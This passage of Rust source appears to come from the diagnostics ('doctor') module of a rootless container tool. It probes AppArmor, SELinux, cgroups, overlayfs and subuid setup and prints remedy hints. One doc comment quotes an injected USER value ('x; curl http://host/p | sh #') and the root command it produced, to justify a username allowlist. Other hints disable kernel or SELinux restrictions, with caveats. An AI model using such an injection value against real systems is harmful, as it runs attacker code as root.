            "enable: sysctl -w kernel.unprivileged_userns_clone=1 (Debian) - see the AppArmor check below on Ubuntu".into(),
        ),
        // A FAILURE, not a warning: no box starts here, so the summary must not end in "ready".
        //
        // THE PROFILE IS THE FIRST REMEDY AND THE SYSCTL THE SECOND, and the order used to be the
        // other way round. Turning the sysctl off re-enables unprivileged user namespaces for
        // EVERY program on the machine, which is what the distribution turned the restriction on
        // to prevent, and it does not survive a reboot without a `sysctl.d` file as well. The
        // profile is scoped to this binary, grants one permission, and persists. MEASURED on a
        // stock Ubuntu 24.04 with the restriction left at 1: without the profile no box starts,
        // with it `kern box` and `kern pod create` both work and doctor reads ready.
        //
        // The sysctl stays named, because somebody with no root, an immutable image, or a distro
        // whose parser differs cannot install a profile and needs the other answer.
        Userns::NoMap => R::Fail(
            "unprivileged user namespaces: the namespace is allowed and its uid map is REFUSED - no box can start"
                .into(),
            no_map_hint(),
        ),
    }
}

/// The AppArmor profile, compiled into the binary.
///
/// EMBEDDED RATHER THAN REFERENCED, because the install line this hint prints has to be runnable
/// by the person reading it. The release tarball contains the binary and nothing else
/// (`tar -C dist -czf … kern` in `release.yml`), and `cargo install` copies one file, so a reader
/// who did either has no `packaging/` directory and a repo-relative path in the message fails with
/// "No such file". Loud rather than silent, but still a message that told them to run something
/// they cannot run.
const APPARMOR_PROFILE: &str = include_str!("../../../packaging/apparmor/kern");

/// `kern doctor --apparmor-profile`: the profile on stdout, nothing else.
///
/// Separate from [`doctor`] so neither does the other's job: the report never writes or emits a
/// file, and this never runs a probe. Piping is the caller's business, which is what keeps kern
/// out of `/etc/apparmor.d` as a side effect of running.
pub fn print_apparmor_profile() -> Result<(), Error> {
    use std::io::Write;
    let mut out = std::io::stdout().lock();
    out.write_all(APPARMOR_PROFILE.as_bytes())
        .and_then(|()| out.flush())
        .map_err(|e| Error::Sandbox(format!("apparmor profile: {e}")))
}

/// The remedy for [`Userns::NoMap`], as a function because it has to name THIS binary's path.
///
/// AppArmor matches a profile to the executable by path, so a kern installed somewhere the shipped
/// profile does not list loads it cleanly, changes nothing, and leaves this same blocker on screen:
/// a silent no-op, which is the worst diagnostic shape available. Printing the path turns "I
/// installed it and nothing happened" into something the reader can act on.
///
/// THE PROFILE IS OFFERED FIRST AND THE SYSCTL SECOND. Turning the sysctl off re-enables
/// unprivileged user namespaces for every program on the machine, which is what the distribution
/// turned the restriction on to prevent, and it is lost at reboot. The profile is scoped to this
/// binary and persists. The sysctl stays named because somebody with no root, an immutable image
/// or a different parser cannot install a profile and needs the other answer.
///
/// RE-RUNNING `doctor` IS PART OF THE INSTRUCTION, not politeness. AppArmor attaches at `execve`,
/// so this process cannot see a profile loaded after it started and neither can anything it forks.
/// MEASURED on Ubuntu 24.04: with the profile loaded, a fresh `kern doctor` reports the namespaces
/// enabled while one started beforehand still reports the blocker. A self-check inside this run
/// would therefore report a stale answer, which is why there is not one.
fn no_map_hint() -> String {
    let me = std::env::current_exe()
        .map(|p| p.display().to_string())
        .unwrap_or_else(|_| "kern".into());
    format!(
        "an LSM is blocking the rootless map; on Ubuntu 23.10+ that is AppArmor. Install the \
         profile this binary carries, then run the check again: `{me} doctor --apparmor-profile | \
         sudo tee /etc/apparmor.d/kern >/dev/null && sudo apparmor_parser -r /etc/apparmor.d/kern \
         && {me} doctor`. THE LAST STEP IS NOT OPTIONAL: AppArmor attaches at exec, so a kern that \
         was already running cannot see a profile loaded afterwards. The profile also attaches BY \
         PATH and you are running {me}, so if that path is not in its attachment line the profile \
         loads and changes nothing. If it still says this after the reload, or you cannot install \
         one at all, `sudo sysctl -w kernel.apparmor_restrict_unprivileged_userns=0` always works \
         and then run `{me} doctor` again - but it lifts the restriction for every program on the \
         machine and is lost at reboot"
    )
}

/// Ubuntu 23.10+ restricts unprivileged userns via AppArmor even when the namespace sysctls allow it.
///
/// The SYSCTL ALONE IS NOT THE VERDICT, and this used to hedge with "if boxes fail with EPERM"
/// because it could not tell. `check_userns` above now probes the map write, so this reports what
/// the knob is set to and defers the question of whether anything is actually broken to the check
/// that measured it. A host can carry the restriction and still run boxes, with a profile for the
/// kern binary, so the knob being on is not by itself a failure.
fn check_apparmor_userns() -> R {
    apparmor_userns_verdict(
        read_int("/proc/sys/kernel/apparmor_restrict_unprivileged_userns"),
        probe_userns(),
    )
}

fn apparmor_userns_verdict(sysctl: Option<i64>, probe: Userns) -> R {
    match (sysctl, probe) {
        // The knob is on AND nothing can map: `check_userns` has already failed, and repeating the
        // failure here would count one broken host twice.
        (Some(1), Userns::NoMap) => R::Warn(
            "AppArmor restricts unprivileged user namespaces (Ubuntu 23.10+): it refused the map above".into(),
            "sudo sysctl -w kernel.apparmor_restrict_unprivileged_userns=0 (or add an AppArmor profile for the kern binary)".into(),
        ),
        // On, and boxes work anyway: a profile covers the kern binary. Worth naming, not warning.
        (Some(1), _) => R::ok(
            "AppArmor restricts unprivileged user namespaces (Ubuntu 23.10+), but this kern maps them anyway"
                .into(),
        ),
        _ => R::ok("AppArmor: not restricting unprivileged user namespaces".into()),
    }
}

/// SELinux is the RHEL-family counterpart of the AppArmor gate above, and until this existed `kern
/// doctor` probed one and not the other: on Fedora, RHEL, CentOS, Rocky and Alma it printed a full
/// page of green without once looking at the mechanism that governs those hosts.
///
/// ENFORCING IS NOT A FAULT, so this does not warn about it. It is the correct posture on every
/// distro that ships it, and a permanent warning on a correctly configured host teaches the reader
/// to skim past `doctor`, which costs more than it buys. The mode is REPORTED, as a fact, because a
/// pasted `doctor` output is how a maintainer reads someone else's host: one line saying `enforcing`
/// turns an otherwise inexplicable report into a first hypothesis. The actionable hint belongs at
/// the moment of the failure, not standing on every Fedora host forever, and it is in the pod's
/// pasta-refused message instead.
///
/// WHAT IT READS AND WHY. `/sys/fs/selinux/enforce` is the kernel's own interface and reports the
/// RUNTIME mode; `/etc/selinux/config` is the mode after the next boot and can differ from now, so
/// it is deliberately not consulted. Nothing here is exercised: this is an inspection, it says so,
/// and it claims nothing about whether a box will start.
///
/// THE THREE-STATE READ. `read_int` returns `None` both when the file is absent and when it cannot
/// be parsed, and those are different facts: absent means SELinux is not active, unreadable means
/// the mode is unknown. Existence is therefore tested separately rather than inferred from a failed
/// parse, which is the same substitution that produced the defect this check was written after.
fn check_selinux() -> R {
    // The filesystem, not the file: a kernel without SELinux has neither, and conflating "no
    // selinuxfs" with "cannot read enforce" is what the split exists to prevent.
    selinux_verdict(
        std::path::Path::new(SELINUXFS).is_dir(),
        std::fs::read_to_string(SELINUX_ENFORCE).ok(),
    )
}

const SELINUXFS: &str = "/sys/fs/selinux";
const SELINUX_ENFORCE: &str = "/sys/fs/selinux/enforce";

/// The verdict as a PURE function of the two facts, so all five states are unit-testable without a
/// host that has SELinux. They were reachable only by building a container per state and
/// bind-mounting a fake `selinuxfs` over it, which no CI run will ever do, and one of the five was
/// wrong when that was the only way to look: a readable `enforce` holding a non-number reported
/// "could not be read", which it had been.
///
/// `mode` is the file's RAW contents rather than a parsed integer for exactly that reason. Parsing
/// first collapses "absent or unopenable" and "read fine, is not a number" into one `None`, and
/// those are different facts about the host.
fn selinux_verdict(selinuxfs_present: bool, mode: Option<String>) -> R {
    if !selinuxfs_present {
        // "NOT VISIBLE FROM HERE", not "not active on this host", and the difference is not
        // pedantry: selinuxfs is a mount, and a container that does not mount it sees exactly this
        // while the host underneath is Enforcing and refusing things. kern is frequently run inside
        // one. The old wording asserted a fact about the host that this probe cannot establish, and
        // a reader chasing a denial would have crossed SELinux off the list on the strength of it.
        return R::ok_note(
            "SELinux: no selinuxfs visible from here",
            "not in force for this process; a host policy can still apply if kern is running \
             inside a container that does not mount it",
        );
    }
    // THE AUDIT LOG IS THE WRONG PLACE TO LOOK, and this hint said to look there until a Fedora 43
    // VM with SELinux Enforcing was built to check. The denial that stops pod egress produces NO
    // AVC: `ausearch -m avc -ts recent` and the kernel journal are both empty while pasta is being
    // refused, because the policy `dontaudit`s it. A reader sent to the audit log finds nothing and
    // concludes SELinux is not involved, which is the opposite of true.
    //
    // Toggling enforcement is the discriminator that works, and it is one variable: same binary,
    // same host, same file. Measured, with the shipped v0.9.2 on Fedora 43 (kernel 6.17.1,
    // passt-selinux installed):
    //
    //   Permissive -> services reach each other by name + outbound to the internet (pasta)
    //   Enforcing  -> loopback-only ... netns dir open: Permission denied, exiting
    let hint = "read it with `getenforce`. If a pod has no egress, `sudo setenforce 0`, retry, then \
                `sudo setenforce 1`: that is the discriminator, because the denial is `dontaudit`ed \
                and the audit log stays empty while it happens";
    match mode.as_deref().map(str::trim) {
        Some("1") => R::ok_note(
            "SELinux: ENFORCING",
            "kern's isolation is unaffected; a policy can still refuse what the kernel would \
             allow, e.g. pod egress",
        ),
        Some("0") => R::ok("SELinux: permissive (denials are logged, nothing is refused)".into()),
        Some(other) => R::Warn(
            format!(
                "SELinux is present and {SELINUX_ENFORCE} holds {:?}, which is neither 0 nor 1",
                crate::ui::scrub(other).chars().take(40).collect::<String>()
            ),
            hint.into(),
        ),
        None => R::Warn(
            format!("SELinux is present but {SELINUX_ENFORCE} could not be opened"),
            hint.into(),
        ),
    }
}

fn check_max_userns() -> R {
    match read_int("/proc/sys/user/max_user_namespaces") {
        Some(n) if n > 0 => R::ok(format!("max_user_namespaces: {n}")),
        Some(_) => R::Fail(
            "max_user_namespaces is 0 - user namespaces are capped off".into(),
            "sysctl -w user.max_user_namespaces=10000".into(),
        ),
        None => R::ok("max_user_namespaces: (default)".into()),
    }
}

/// The hint for "the controller is there and a cap still does not bind", chosen from what this user
/// can actually do here.
///
/// The single fixed string it replaces told every reader to `echo +memory > cgroup.subtree_control`.
/// A macOS tester ran it on a colima guest (2026-08-29), where an ssh session sits in
/// `/system.slice/ssh.service` owned by root: the write is refused, the shell prints nothing, and the
/// next `kern box` is still uncapped. A hint that cannot work on the host it is printed on is worse
/// than none, because the reader spends the attempt and concludes kern is broken rather than
/// undelegated.
fn delegation_hint() -> String {
    // Every branch ends with the same CHECK, because an independent test who saw this warning and a 137 from a
    // `--memory` box on the same host had no way to tell which of the two was describing kern's cap.
    // `memory_max_enforced` is read back from the box's own cgroup, so `null` there agrees with this
    // row and a number contradicts it; and a kill by kern's OWN cap always prints kern's OOM line,
    // which a system OOM kill (also SIGKILL, also exit 137) does not.
    let common = "boxes still run and the isolation holds; to check this row against a running box, \
                  read `memory_max_enforced` in `kern inspect --json` (null = nothing in force, and \
                  an exit 137 without kern's own OOM message on stderr is the SYSTEM's OOM killer, \
                  not a cap)";
    match kern_isolation::delegation_blocker() {
        kern_isolation::DelegationBlocker::ControllerNotEnabled => format!(
            "{common}; add `memory` to this tree's `cgroup.subtree_control`, or run kern under a \
             delegated `systemd --user` scope"
        ),
        // Root is NOT offered as the fix. On a guest with colima's shape it was measured not to be
        // one (uid 0, `--memory 32m`, a 200 MiB write survived: the controller was never delegated
        // down, and being root does not delegate it), so pointing at the probe is the honest form.
        kern_isolation::DelegationBlocker::NotWritable => format!(
            "{common}; this cgroup is not writable by you, so no `cgroup.subtree_control` write \
             helps - a cap needs a delegated `systemd --user` scope; `sudo kern doctor` says \
             whether root gets one here"
        ),
        kern_isolation::DelegationBlocker::Neither => format!(
            "{common}; `memory` is already in this tree's `cgroup.subtree_control` and a cap still \
             does not read back - a cap needs a delegated `systemd --user` scope; `sudo kern doctor` \
             says whether root gets one here"
        ),
    }
}

/// The verdict on a host with NO systemd user manager, as a pure function of the two facts.
///
/// Split out of [`check_cgroup`] for the reason the whole-list gate exists: a machine is in exactly
/// one of these states, so four of the five render nowhere a developer can see them. Two were 255
/// characters on one line and reached CI that way, because the probed cgroup path is interpolated
/// into the verdict and a GitHub runner's is
/// `/sys/fs/cgroup/system.slice/hosted-compute-agent.service`. A path is EVIDENCE: it belongs on
/// the second line with the remedy, not in the sentence that says what is wrong.
fn no_user_manager_verdict(state: kern_isolation::MemoryCapState, sites: &str) -> R {
    use kern_isolation::MemoryCapState;
    match state {
        MemoryCapState::Enforced => R::ok(
            "cgroup v2, no systemd --user manager needed: caps enforced in the current cgroup"
                .into(),
        ),
        // Reachable only if a transient scope carried a `MemoryMax` that bound while this host
        // reports no user manager. Not observed anywhere; report what was measured, not a state
        // derived from the two facts disagreeing.
        MemoryCapState::EnforcedOnScope => R::ok_note(
            "cgroup v2: caps enforced on a transient scope (probed in force)",
            "no systemd --user manager was detected, which is not the arrangement this is \
             expected in",
        ),
        MemoryCapState::PresentNotDelegated => R::Warn(
            "cgroup v2, no systemd --user manager, and `memory` is NOT delegated to a child cgroup"
                .into(),
            format!(
                "a `--memory` write is accepted and silently never bites ({sites}). {}",
                delegation_hint()
            ),
        ),
        MemoryCapState::Absent => R::Warn(
            "cgroup v2, no systemd --user manager, and `memory` is not in this cgroup's tree"
                .into(),
            format!(
                "`--memory`/`--pids-limit` will not bind ({sites}); boxes still run and the \
                 isolation holds. Enable `cgroup_enable=memory` (stock Raspberry Pi OS) or use a \
                 kernel that delegates it (Microsoft's default WSL2 kernel does not)"
            ),
        ),
        MemoryCapState::Unknown => R::Warn(
            "cgroup v2 present, but `/proc/self/cgroup` could not be read to probe a `--memory` cap"
                .into(),
            "unusual; boxes still run with namespace + seccomp isolation, only the resource cap is \
             uncertain"
                .into(),
        ),
    }
}

fn check_cgroup() -> R {
    use kern_isolation::MemoryCapState;
    if !std::path::Path::new("/sys/fs/cgroup/cgroup.controllers").exists() {
        return R::Warn(
            "cgroup v2 not found - memory/pids caps (`--memory`, `--pids-limit`) won't be enforced".into(),
            "boxes still run (isolation holds); enable the unified cgroup v2 hierarchy for resource caps".into(),
        );
    }
    // No systemd --user manager does NOT mean no caps, and this row used to say it did. Inside WSL2
    // there is no user manager at all, yet kern runs in the root cgroup with `memory` in its
    // `subtree_control` and a box reads its `memory.max` back as 268435456 while 200 MiB under
    // `--memory 32m` exits 137. doctor called that "best-effort" and "may not bind" on a platform kern
    // ships for, on the same machine where the runtime correctly printed no warning at all.
    //
    // So ask the question the runtime asks - and ask it by DOING it, not by reading a presence flag.
    // The prior version gated on `memory_cap_enforceable()`, which reads `cgroup.controllers`: on a
    // host where `memory` is listed there but not delegated to children (root inside a container),
    // that returned true and doctor reported "enforced" while a real `memory.max` write never bound.
    // `memory_cap_state()` creates a throwaway child, writes its `memory.max`, reads it back, and
    // removes it - the exact operation a box performs - so the three states are told apart.
    if !kern_isolation::user_systemd_present() {
        return no_user_manager_verdict(
            kern_isolation::memory_cap_state(),
            &memory_probe_sites_phrase(),
        );
    }
    // A scope alone isn't enough, and neither is the controller being LISTED: the box's `memory.max`
    // only binds if the memory controller is actually delegated to the box's cap target AND a write to
    // it takes. Some distros (Raspberry Pi OS) delegate only `cpu`+`pids`; some list `memory` yet the
    // write is inert (root inside a container). So WRITE-PROBE the box's real target - its delegated
    // slice, the same one `apply_limits` writes - instead of reading the user manager's delegated set.
    let cap_state = kern_isolation::memory_cap_state();
    match cap_state {
        // A DELEGATED controller is not the same as an ENFORCEABLE knob. On an Arduino UNO Q's Android
        // kernel `cgroup.controllers` lists `cpu`, yet no `cpu.max` exists anywhere in the chain: the
        // controller is there with only its *weight* interface, so `--cpus` is a share, not a ceiling.
        // Memory is now write-probed; cpu keeps its own bandwidth-interface check so this row never
        // tells a comfortable lie about a knob it did not look at.
        //
        // Two ways the cap is real, and the row names WHICH: the direct write into the box's cap
        // target, or the user manager applying `MemoryMax` to the box's own transient scope. On all
        // three ARM boards only the second holds, and reporting just the first made this row deny a cap
        // the kernel was enforcing (see `MemoryCapState::EnforcedOnScope`).
        MemoryCapState::Enforced | MemoryCapState::EnforcedOnScope => {
            let how = if cap_state == MemoryCapState::Enforced {
                "`--memory` write-probed to bind"
            } else {
                "`--memory` applied by the user manager on the box's own scope, probed in force"
            };
            if cpu_bandwidth_interface_present() {
                R::ok(format!(
                    "cgroup v2 + systemd --user scope: resource caps enforced ({how})"
                ))
            } else {
                R::Warn(
                    "memory/pids caps are enforced, but this kernel's `cpu` controller has no `cpu.max`"
                        .into(),
                    "so `--cpus` is a SHARE here, not a ceiling; needs CONFIG_CFS_BANDWIDTH=y. \
                     Memory and pids caps are unaffected"
                        .into(),
                )
            }
        }
        // Couldn't read `/proc/self/cgroup` to resolve the target - don't over- or under-claim.
        MemoryCapState::Unknown => {
            R::ok("cgroup v2 + systemd --user scope: memory/pids/cpu caps where delegated".into())
        }
        // The write did not bind in the box's cap target. Name the user manager's delegated set so the
        // fix (enable `memory` delegation) is actionable.
        MemoryCapState::PresentNotDelegated | MemoryCapState::Absent => {
            let have = delegated_controllers();
            let listed = if have.is_empty() {
                "none readable".to_string()
            } else {
                have.join(" ")
            };
            R::Warn(
                "systemd --user scope present but a `--memory` write does not bind in the box's \
                 cap target"
                    .into(),
                format!(
                    "{}; user manager delegates: {listed}. `--memory` won't be enforced \
                     (`--cpus`/`--pids-limit` may still work). Enable it: \
                     /etc/systemd/system/user@.service.d/delegate.conf → [Service] \
                     Delegate=memory pids cpu cpuset, then reboot (common on Raspberry Pi OS)",
                    memory_probe_sites_phrase()
                ),
            )
        }
    }
}

/// The directories the `--memory` probe actually wrote into, formatted for a report row.
///
/// An outside independent test held a release on this row: doctor said a `--memory` write "silently never
/// bites" while a box on the same host exited 137 under `--memory`, and the sentence named no
/// directory, so neither of us could tell whether the two statements were even about the same cgroup.
/// Their box's PID 1 sat in `0::/`. A verdict about a cgroup that does not say WHICH cgroup cannot be
/// checked against `/proc/<pid>/cgroup`, so every negative memory row now carries these paths.
///
/// The paths come from [`kern_isolation::memory_cap_probe_sites`], the same call the probe resolves
/// its targets with, so this can never name a directory the probe did not use.
fn memory_probe_sites_phrase() -> String {
    let (slice, own) = kern_isolation::memory_cap_probe_sites();
    let mut sites: Vec<String> = Vec::new();
    for s in [slice, own].into_iter().flatten() {
        let d = s.display().to_string();
        if !sites.contains(&d) {
            sites.push(d);
        }
    }
    if sites.is_empty() {
        "no cap target could be resolved".to_string()
    } else {
        format!("probed a child of: {}", sites.join(", "))
    }
}

/// The cgroup controllers the systemd **user manager** can hand to a box's transient scope - read
/// from `user@<uid>.service/cgroup.controllers`. Empty if it can't be read.
fn delegated_controllers() -> Vec<String> {
    let uid = unsafe { libc::getuid() };
    let path =
        format!("/sys/fs/cgroup/user.slice/user-{uid}.slice/user@{uid}.service/cgroup.controllers");
    std::fs::read_to_string(path)
        .map(|s| s.split_whitespace().map(str::to_string).collect())
        .unwrap_or_default()
}

fn check_overlay() -> R {
    let supported = std::fs::read_to_string("/proc/filesystems")
        .map(|s| {
            s.lines()
                .any(|l| l.split_whitespace().last() == Some("overlay"))
        })
        .unwrap_or(false);
    if supported {
        // `/proc/filesystems` answers a DIFFERENT QUESTION from the one that matters, and this row
        // used to report only that one. The file says the kernel has an overlay driver; what a
        // rootless box rootfs and a layered build both need is an overlay mounted from inside an
        // UNPRIVILEGED USER NAMESPACE, which a kernel can list and still refuse. The probe below
        // performs exactly that mount, so its verdict is the one `kern build` acts on.
        //
        // Both scopes are named, because they are what a reader compares against: a field report saw
        // `✔ overlayfs: available` from this row and `[flat · unprivileged overlay unavailable]` from
        // a build minutes later, with nothing anywhere saying the two sentences were about different
        // things.
        match overlay_probe() {
            OverlayProbe::Works(ms) if ms >= 5.0 => R::Warn(
                format!(
                    "overlayfs works but costs {ms:.0} ms per mount on this kernel, which is most of a box's start time"
                ),
                "measured constant here: same cost with an EMPTY lowerdir and with everything on tmpfs, so it is not your disk or your image. `--bind-rootfs` skips it (91.9 -> 11.3 ms per box on an Arduino UNO Q) but binds the source directly: mutable and shared between boxes, where the overlay root is per-box and leaves the source untouched".into(),
            ),
            OverlayProbe::Works(_) => R::ok(
                "overlayfs: available unprivileged (box rootfs AND layered builds)".into(),
            ),
            // THE STATE THIS ROW USED TO CALL `available`. The driver is listed and the mount is
            // refused, so every box falls back and every build copies its base.
            OverlayProbe::Refused => R::Warn(
                "overlayfs is listed in /proc/filesystems but an UNPRIVILEGED mount is refused here"
                    .into(),
                format!(
                    "that is the mount a rootless box rootfs and a layered build both need, so builds copy the whole base image on every run (`[flat · unprivileged overlay unavailable]`) and boxes fall back to a plain rootfs. Common on WSL2 and on vendor kernels. Nothing here is broken; the cost is the copy{}",
                    // AND WHAT THE COPY COSTS, which is a property of the filesystem holding the
                    // image cache and not of kern. `copy_tree` passes `--reflink=auto`: a
                    // copy-on-write filesystem clones the base for almost nothing, and everything
                    // else re-reads and re-writes it in full. Saying "the cost is the copy" without
                    // that leaves the reader with a number and no way to act on it.
                    match crate::commands::supports_reflink(&crate::commands::cache_dir()) {
                        Some(true) =>
                            ", which this filesystem clones (copy-on-write), so it is nearly free",
                        Some(false) =>
                            ", and this filesystem has no copy-on-write, so it is a full re-read and re-write of the base each time. A cache on btrfs, xfs or bcachefs clones it instead",
                        None => "",
                    }
                ),
            ),
            OverlayProbe::NoUserns => R::Warn(
                "overlayfs is listed but the probe could not create a user namespace".into(),
                "the overlay question cannot be answered without one, and unprivileged user namespaces are what every box needs first - see the `unprivileged user namespaces` row above for the remedy".into(),
            ),
            // NOT A VERDICT. The measurement did not complete, and reporting either answer would be
            // inventing a fact from a failed probe.
            OverlayProbe::Unknown => R::Warn(
                "overlayfs is listed in /proc/filesystems, but the unprivileged-mount probe did not complete".into(),
                "so this host's real capability is unknown here: `kern build` names what it found on the line it prints, and a box reports its own fallback. Re-run `kern doctor`; a probe that keeps timing out is worth reporting".into(),
            ),
        }
    } else {
        R::Warn(
            "overlayfs not listed in /proc/filesystems".into(),
            "kern falls back to `--bind-rootfs` (mutable, shared) where overlay is unavailable"
                .into(),
        )
    }
}

/// Is this a name that may be pasted into a shell command kern prints?
///
/// `$USER` is ENVIRONMENT, which means it is whatever the caller decided, and `check_uid_range`
/// interpolates it into a `sudo tee` line the reader is invited to copy. With `USER='x; curl
/// http://host/p | sh #'` kern printed
///
///     `echo x; curl http://host/p | sh #:100000:65536 | sudo tee -a /etc/subuid /etc/subgid`
///
/// which is a command that runs an attacker's script as root, printed by the tool the reader ran to
/// find out whether their machine is safe. An ANSI escape in the same variable also reaches the
/// terminal verbatim and can repaint or hide the rest of the report. Neither is exotic: a container
/// image, a CI runner or a `sudo -E` all get to set `USER`. Found by an outside review of this
/// module on 2026-08-28, in code that predates the GPU work but was read because of it.
///
/// The allowlist is the portable POSIX user-name set, plus the leading-hyphen rule that keeps a name
/// from being read as an option, plus a length cap. Anything else is not sanitised or escaped: kern
/// falls back to the NUMERIC uid, which `/etc/subuid` accepts, is always correct, and cannot carry a
/// payload. Rejecting into a safe value beats quoting, because a quoted hostile name would still be
/// a hostile name in the file the operator ends up editing.
fn is_pasteable_username(name: &str) -> bool {
    !name.is_empty()
        && name.len() <= 32
        && !name.starts_with('-')
        && name
            .bytes()
            .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'_' | b'.' | b'-'))
}

/// The identities under which `/etc/subuid` may legitimately carry THIS uid's allocation, most
/// specific first: the login name from `/etc/passwd`, which is what `useradd` and a distro's own
/// tooling write, and the numeric uid, which shadow-utils also accepts.
///
/// `$USER` is deliberately NOT one of them. It is environment, so it is whatever the caller decided:
/// it can name a different account than the one we are running as, and it can be absent entirely
/// (a container, `sudo` without `-E`, a CI runner, any daemon). Both of those were real defects
/// here, and the second was reported from the field: with `USER` unset the lookup searched for lines
/// beginning with `":"`, matched nothing, and `doctor` told an operator whose map was perfectly fine
/// that `--uid-range` would fall back to a single-uid map. The tool people run BEFORE anything else
/// was the one lying.
///
/// Pure and total on purpose: the caller supplies `/etc/passwd`, so the table can be tested without
/// a matching account existing on the machine running the tests.
fn subid_identities(uid: u32, passwd: &str) -> Vec<String> {
    let mut out = Vec::new();
    if let Some(name) = passwd.lines().find_map(|l| {
        let mut f = l.split(':');
        let name = f.next()?;
        // Fields are name:passwd:uid:gid:..., so the uid is the one after the placeholder.
        let found: u32 = f.nth(1)?.trim().parse().ok()?;
        (found == uid && !name.is_empty()).then(|| name.to_string())
    }) {
        out.push(name);
    }
    out.push(uid.to_string());
    out
}

/// True when `/etc/subuid` carries an allocation for any of `ids`. A line is `name:start:count`, so
/// the identity must match up to the first colon and not merely be a prefix of a longer name:
/// `kern:100000:65536` is not an allocation for `ke`.
fn has_subid_allocation(subuid: &str, ids: &[String]) -> bool {
    subuid
        .lines()
        .filter_map(|l| l.split(':').next())
        .any(|owner| ids.iter().any(|id| owner.trim() == id))
}

fn check_uid_range() -> R {
    // SAFETY: `getuid` is infallible and takes no arguments.
    let uid = unsafe { libc::getuid() };
    let passwd = std::fs::read_to_string("/etc/passwd").unwrap_or_default();
    let ids = subid_identities(uid, &passwd);
    let has_helper = which("newuidmap") && which("newgidmap");
    let has_subid = std::fs::read_to_string("/etc/subuid")
        .map(|s| has_subid_allocation(&s, &ids))
        .unwrap_or(false);
    if has_helper && has_subid {
        return R::ok("--uid-range / --user / --ssh: newuidmap + /etc/subuid present".into());
    }
    // Emit the two EXACT commands, not "install uidmap and add an allocation". kern deliberately does
    // NOT write `/etc/subuid`/`/etc/subgid` itself: it is global state shared with shadow-utils and
    // Podman, needs root, and a range overlapping a peer's allocation corrupts that peer's map. kern
    // reports what an operator (or their Ansible) applies; it stays a consumer of the mapping.
    //
    // The pasted name is the one from `/etc/passwd`, checked against the same allowlist that used to
    // guard `$USER`: `/etc/passwd` is root-owned, but a name kern will not print is, for this
    // function, a name that is not there, and the numeric uid behind it is always accepted by
    // shadow-utils and cannot carry a shell metacharacter into the line the reader is invited to run.
    let who = ids
        .iter()
        .find(|id| is_pasteable_username(id))
        .cloned()
        .unwrap_or_else(|| uid.to_string());
    let mut steps: Vec<String> = Vec::new();
    if !has_helper {
        // Do NOT hardcode `apt`: the package and command differ per distro. Name the capability and
        // give the Debian command as the example, so the hint is never wrong on Fedora/Arch/Alpine.
        steps.push(
            "install the `newuidmap`/`newgidmap` helpers (Debian/Ubuntu: `sudo apt install uidmap`; \
             Fedora/Arch/openSUSE ship them in `shadow-utils`/`shadow`)"
                .into(),
        );
    }
    if !has_subid {
        steps.push(format!(
            "`echo {who}:100000:65536 | sudo tee -a /etc/subuid /etc/subgid`"
        ));
    }
    R::Warn(
        "newuidmap/newgidmap or /etc/subuid missing: `--uid-range`, `--user` and `--ssh` get one uid"
            .into(),
        format!(
            "so an official image that chowns to a service user (redis, postgres, nginx) fails at \
             start. Fix: {}",
            steps.join(", then ")
        ),
    )
}

fn check_tools() -> Vec<R> {
    vec![
        // Required for the OCI pull path.
        tool_req("tar", "kern pull / --image", "install GNU tar >= 1.27"),
        tool_req("curl", "kern pull / --image", "install curl"),
        // Optional, per-feature.
        tool_opt(
            "mkfs.ext4",
            "vdisk: disk-backed quota (root)",
            "",
            "tmpfs fallback used without it",
        ),
        tool_opt(
            "sshd",
            "kern box --ssh",
            "",
            "install openssh-server in your images",
        ),
        tool_opt(
            "sshfs",
            "-v sshfs:// network volumes",
            "",
            "install sshfs, or use nfs/smb",
        ),
        tool_opt(
            "pasta",
            // NOT "pod / box": a plain box is loopback-only whatever pasta does, and outbound there
            // comes from `--net` (the host's own stack), not from this tool. Measured: a default box
            // reaches neither an IP nor DNS with pasta installed; the same command in a pod reaches
            // the internet. `doctor` is what a reader runs to learn what will work, so it may not
            // name a capability the next command will not have. That distinction is the NOTE, which
            // is why it is not welded into the capability name.
            "pod outbound networking (NAT + DNS)",
            "a plain box is loopback-only whatever pasta does; `--net` gives it the host's stack",
            "install passt (apt install passt / dnf install passt); without it a pod is loopback-only \
             - peers reach each other but nothing reaches the network (no apk add / pip install). kern \
             uses pasta if present, it does not ship it",
        ),
        landlock(),
    ]
}

/// Does this kernel have Landlock, the LSM behind `--landlock-rw`?
///
/// A box already warns at start when it is missing, and then runs with namespaces + seccomp only.
/// That is honest, but it arrives after you have decided to rely on the confinement. `doctor` is the
/// preflight that answers "will boxes run here?", so it has to answer this too. It matters most
/// exactly where kern is aimed: measured on three ARM boards (Raspberry Pi OS 6.6, Jetson 5.15-tegra,
/// Arduino UNO Q 6.16), NONE of them ships Landlock, and Raspberry Pi OS says so outright with
/// `# CONFIG_SECURITY_LANDLOCK is not set`.
fn landlock() -> R {
    match kern_isolation::landlock_abi() {
        Some(v) => R::ok(format!(
            "Landlock: ABI v{v} (--landlock-rw enforces a write allowlist)"
        )),
        // The wording tracks the runtime, which is FAIL-CLOSED: a box that passes `--landlock-rw`
        // here is REFUSED, not run unconfined. Saying "accepted" would put doctor and the box on
        // opposite sides of the same question, which is the defect class this project keeps paying
        // for: a message that describes behaviour the code no longer has.
        None => R::Warn(
            "Landlock: absent - --landlock-rw REFUSES to run here, on `box` and on `run` (fail-closed)"
                .into(),
            "commands WITHOUT that flag are unaffected: a box still gets namespaces + seccomp + \
             cgroups, and `kern run` still gets its cgroup caps. For the path allowlist you need a \
             kernel with CONFIG_SECURITY_LANDLOCK=y (and `lsm=...,landlock` if your distro gates it)"
                .into(),
        ),
    }
}

fn tool_req(bin: &str, what: &str, hint: &str) -> R {
    if which(bin) {
        R::ok(format!("{bin}: found ({what})"))
    } else {
        R::Fail(format!("{bin}: MISSING - needed for {what}"), hint.into())
    }
}

/// `what` NAMES THE CAPABILITY AND NOTHING ELSE, because it is substituted into two different
/// sentences: "found (`what`)" and "not found - `what` unavailable". A `what` carrying a clause
/// reads correctly in the first and is broken English in the second, which is what pasta's did:
/// "not found - pod outbound networking (NAT + DNS); a plain box is loopback-only, `--net` gives it
/// the host's unavailable". Any qualification goes in `note`, which is a line of its own, and the
/// not-found branch does not need it because `hint` is already that line there.
fn tool_opt(bin: &str, what: &str, note: &str, hint: &str) -> R {
    if which(bin) {
        R::Ok(format!("{bin}: found ({what})"), note.to_string())
    } else {
        R::Warn(
            format!("{bin}: not found - {what} unavailable"),
            hint.into(),
        )
    }
}

fn check_kernel() -> R {
